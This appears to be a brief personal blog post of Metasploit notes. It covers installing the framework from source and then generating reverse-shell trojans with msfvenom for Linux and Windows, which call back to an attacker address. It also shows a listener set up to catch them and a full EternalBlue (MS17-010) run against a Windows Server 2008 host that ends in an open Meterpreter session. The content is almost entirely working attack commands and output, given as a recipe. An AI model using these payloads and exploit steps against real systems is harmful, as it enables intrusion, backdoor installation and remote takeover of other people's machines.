---
layout: post
title: "metasploit"
---

```
apt install -y build-essential zlib1g zlib1g-dev libpq-dev libpcap-dev libsqlite3-dev ruby ruby-dev
```

```
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework/
sudo gem install bundler
bundle install

ln -s /root/metasploit-framework/msfconsole /usr/local/bin/
ln -s /root/metasploit-framework/msfvenom /usr/local/bin/


git config --global user.name "NAME HERE"
git config --global user.email "email@example.com"
./msfupdate

crontab -e
0 1 * * * /root/metasploit-framework/msfupdate > /dev/null 2>&1
```



生成反弹木马
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.1.1.1 LPORT=4444 -f elf -o backdoor.elf

# for windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=139.1.1.1 LPORT=80 -f exe -o ~/shell.exe
```

```
# msfconsole
msf6 > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 139.1.1.1
msf exploit(handler) > set LPORT 80
msf exploit(handler) > show options

msf exploit(handler) > exploit

```


永恒之蓝
```
msf6 > nmap -p 445 192.168.59.0/24 --open
[*] exec: nmap -p 445 192.168.59.0/24 --open

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 02:17 PST
Nmap scan report for 192.168.59.197
Host is up (0.00087s latency).



msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhost 192.168.59.197
rhost => 192.168.59.197
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit 

[+] 192.168.59.197:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7600 x64 (64-bit)
[*] 192.168.59.197:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed



msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.59.197
rhost => 192.168.59.197
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.59.55:4444 
[*] 192.168.59.197:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.59.197:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7600 x64 (64-bit)
[*] 192.168.59.197:445    - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.59.197:445 - Connecting to target for exploitation.
[+] 192.168.59.197:445 - Connection established for exploitation.
[+] 192.168.59.197:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.59.197:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.59.197:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.59.197:445 - 0x00000010  30 30 38 20 52 32 20 44 61 74 61 63 65 6e 74 65  008 R2 Datacente
[*] 192.168.59.197:445 - 0x00000020  72 20 37 36 30 30                                r 7600          
[+] 192.168.59.197:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.59.197:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.59.197:445 - Sending all but last fragment of exploit packet
[*] 192.168.59.197:445 - Starting non-paged pool grooming
[+] 192.168.59.197:445 - Sending SMBv2 buffers
[+] 192.168.59.197:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.59.197:445 - Sending final SMBv2 buffers.
[*] 192.168.59.197:445 - Sending last fragment of exploit packet!
[*] 192.168.59.197:445 - Receiving response from exploit packet
[+] 192.168.59.197:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.59.197:445 - Sending egg to corrupted connection.
[*] 192.168.59.197:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 192.168.59.197
[*] Meterpreter session 1 opened (192.168.59.55:4444 -> 192.168.59.197:49159) at 2020-12-29 01:36:46 -0800
[+] 192.168.59.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.59.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.59.197:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 

```
